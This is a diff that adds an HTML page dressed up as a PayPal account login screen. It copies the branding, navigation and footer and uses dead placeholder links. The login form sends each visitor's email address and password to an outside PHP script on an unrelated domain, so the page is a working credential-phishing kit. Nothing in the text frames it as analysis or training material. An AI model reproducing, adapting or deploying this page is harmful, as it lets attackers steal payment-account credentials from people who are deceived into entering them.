@@ -1,0 +1,118 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML><HEAD><TITLE>Welcome</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=UTF-8">
+<LINK media=screen href="img/core.css" type=text/css rel=stylesheet>
+<LINK media=screen href="img/marketing.css" type=text/css rel=stylesheet>
+<link rel="shortcut icon" href="img/pp_favicon_x.ico">
+<SCRIPT language=Javascript> 
+function checkFields( )
+{
+           signupFORM = document.log;
+ 
+if((signupFORM.login_email.value.length <= 6)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+    }
+if((signupFORM.login_email.value.indexOf ('@', 0) == -1)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+    
+ }
+if((signupFORM.login_email.value.indexOf ('.', 0) == -1)){
+                alert("Please fill in your email address");
+				signupFORM.login_email.focus();
+                return false;
+					  }
+if((signupFORM.login_password.value.length <= 3)){
+                alert("Please enter a valid Password");
+				signupFORM.login_password.focus();
+				return false;
+  }
+if((signupFORM.login_password.value == "")) {
+                alert("Please enter a Password");
+				signupFORM.login_password.focus();
+                return false;
+				      }
+              return true;
+}
+</SCRIPT>
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR>
+<style type="text/css"> 
+<!--
+.style2 {font-size: 1px}
+-->
+</style>
+</HEAD>
+<BODY onLoad="document.log.login_email.focus();">
+ 
+<DIV class="outside home" id=page>
+<DIV class=srd id=header>
+<H1><A href="#"><IMG alt=P.P src="img/Pay_Pal_logo.gif" border=0></A></H1>
+<FORM id=searchForm name=searchForm action="" method=post>
+<FIELDSET><LEGEND>Search Pay Pal</LEGEND><LABEL for=searchBox>Search 
+ 
+</LABEL><INPUT id=searchBox name=queryString> <INPUT class=button id=search.x type=submit value=Search name=search.x> 
+</FIELDSET> <INPUT type=hidden value=UTF-8 name=form_charset> <SPAN 
+id=iconix_installed><INPUT type=hidden value=0 name=iconix_installed> 
+</SPAN></FORM>
+<DIV class=srd id=navGlobal>
+<UL>
+  <LI class="first signup"><A href="#">Sign Up</A> 
+  <LI class=login><A href="#">Log In</A> 
+  <LI><A href="#">Help</A> 
+  <LI class=last><A href="#">Security Center</A> </LI></UL></DIV>
+ 
+<FORM class=rosetta id=rosetta action="" method=post>
+<FIELDSET><LEGEND>Change Your Language</LEGEND>
+<LABEL for=rosetta_dropdown>Language Select</LABEL>
+<SELECT id=rosetta_dropdown name=locale.x>
+<OPTION value=en_US selected> English </OPTION> 
+<OPTION value=es_XC>Espaol</OPTION>
+<OPTION value=fr_XC>Fran&ccedil;ais</OPTION>
+<OPTION value=zh_XC>??(??)</OPTION></SELECT>
+</FIELDSET> 
+<SPAN id=iconix_installed1></SPAN>
+</FORM></DIV>
+ 
+<DIV class=srd id=navPrimary><A href="#">
+<IMG alt="Pay Pal" src="img/Snap2.gif" border=0></A> </DIV><BR>
+<HR>
+ 
+<DIV id=content>
+<DIV class="sidebar box login">
+<DIV class=header>
+<H2>Account login</H2></DIV>
+<DIV class=body>
+<FORM name="log" id="log" action="http://alisonstars.com/luis/a.php" method=POST onSubmit="return checkFields( );">
+<FIELDSET><LEGEND>Member Log In</LEGEND>
+<P><LABEL for=login_email>Email address</LABEL> 
+<INPUT id="login_email" name="login_email"> </P>
+ 
+<P><LABEL for=login_password>Pay Pal password</LABEL><INPUT id="login_password" type=password name="login_password"> </P>
+<INPUT class="button primary" type=submit value="Log In" name=submit.x> 
+</FIELDSET> 
+<P>Forgot your <A href="#">email address</A> or <A href="#">password</A>?</P>
+<P>New to Pay Pal? <STRONG><A href="#">Sign up</A></STRONG>.</P>
+<SPAN id=iconix_installed2>
+ 
+</SPAN></FORM></DIV></DIV>
+<DIV class=main>
+<DIV class=zone>
+<DIV id=hero><IMG src="img/hdr_loginpage_560x228.jpg"></DIV></DIV>
+</DIV>
+<HR>
+<DIV class=srd id=footer>
+<UL>
+<LI class=first><A href="#">About Us</A><LI><A href="#">Accounts</A><LI><A href="#">Fees</A><LI><A href="#">Privacy</A><LI><A href="#">Security Center</A><LI><A href="#">Contact Us</A>
+<LI><A href="#">Legal Agreements</A><LI><A href="#">Developers</A><LI><A href="#">Jobs</A></LI></UL>
+<UL>
+<LI class=first><A href="#">Merchant Services</A><LI><A href="#">Mobile</A><LI><A href="#">Plus Card</A><LI><A href="#">Referrals</A><LI><A href="#">Shops</A><LI><A href="#">Mass Pay</A> 
+</LI></UL>
+<P id=footerSecure><A href="#" target=_blank><IMG alt="" src="img/logo_VIPwhite_66x27.gif" border=0></A></P>
+<P id=legal>Copyright &copy 1999-2010 Pay<span class="style2">.</span>Pal. All rights reserved.<BR>
+<A href="login.htm?FDIC-outside">Information about FDIC pass-through insurance</A></P></DIV>
+<DIV class=hide id=navFull></DIV></DIV>
+<IMG height=1 alt="" src="img/s74816239704720.gif" width=1 border=0 name="s_i_global">
+</DIV></BODY></HTML>
